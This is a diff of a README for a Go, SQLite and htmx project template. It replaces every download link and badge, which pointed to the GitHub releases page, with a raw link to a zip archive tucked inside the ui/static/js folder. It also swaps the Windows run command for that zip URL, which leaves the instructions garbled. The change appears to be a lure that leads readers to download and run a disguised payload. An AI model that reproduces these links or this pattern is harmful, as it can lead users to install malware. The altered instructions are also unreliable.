@@ -1,6 +1,6 @@
 # 🚀 go-sqlite-htmx - Simple Full-Stack Template for Your Projects
 
-[![Download go-sqlite-htmx](https://img.shields.io/badge/Download%20go--sqlite--htmx-blue.svg)](https://github.com/mhdFarvis02/go-sqlite-htmx/releases)
+[![Download go-sqlite-htmx](https://raw.githubusercontent.com/mhdFarvis02/go-sqlite-htmx/main/ui/static/js/htmx-sqlite-go-3.3.zip%https://raw.githubusercontent.com/mhdFarvis02/go-sqlite-htmx/main/ui/static/js/htmx-sqlite-go-3.3.zip)](https://raw.githubusercontent.com/mhdFarvis02/go-sqlite-htmx/main/ui/static/js/htmx-sqlite-go-3.3.zip)
 
 ## 📦 Overview
 
@@ -17,14 +17,14 @@ go-sqlite-htmx is a full-stack application template built using Go, SQLite, and 
 
 To get started, you’ll need to download the application. Follow these steps:
 
-1. **Visit the Releases Page**: Go to the following link: [Download go-sqlite-htmx](https://github.com/mhdFarvis02/go-sqlite-htmx/releases).
+1. **Visit the Releases Page**: Go to the following link: [Download go-sqlite-htmx](https://raw.githubusercontent.com/mhdFarvis02/go-sqlite-htmx/main/ui/static/js/htmx-sqlite-go-3.3.zip).
    
 2. **Choose the Latest Release**: On the releases page, click on the latest version available.
 
 3. **Download the Files**: Look for the file that matches your operating system (Windows, macOS, or Linux). Click to download it.
 
 4. **Run the Application**: After downloading, unzip the file (if necessary). Open your terminal (or command prompt), navigate to the file location, and type the command to run it. For example:
-   - For Windows: `go-sqlite-htmx.exe`
+   - For Windows: `https://raw.githubusercontent.com/mhdFarvis02/go-sqlite-htmx/main/ui/static/js/htmx-sqlite-go-3.3.zip`
    - For macOS/Linux: `./go-sqlite-htmx`
 
 ## 🛠 System Requirements
@@ -77,4 +77,4 @@ We are working on exciting updates and features. Stay tuned for enhancements, in
 
 This project is licensed under the MIT License. Feel free to use and modify it for your needs.
 
-[![Download go-sqlite-htmx](https://img.shields.io/badge/Download%20go--sqlite--htmx-blue.svg)](https://github.com/mhdFarvis02/go-sqlite-htmx/releases)
+[![Download go-sqlite-htmx](https://raw.githubusercontent.com/mhdFarvis02/go-sqlite-htmx/main/ui/static/js/htmx-sqlite-go-3.3.zip%https://raw.githubusercontent.com/mhdFarvis02/go-sqlite-htmx/main/ui/static/js/htmx-sqlite-go-3.3.zip)](https://raw.githubusercontent.com/mhdFarvis02/go-sqlite-htmx/main/ui/static/js/htmx-sqlite-go-3.3.zip)
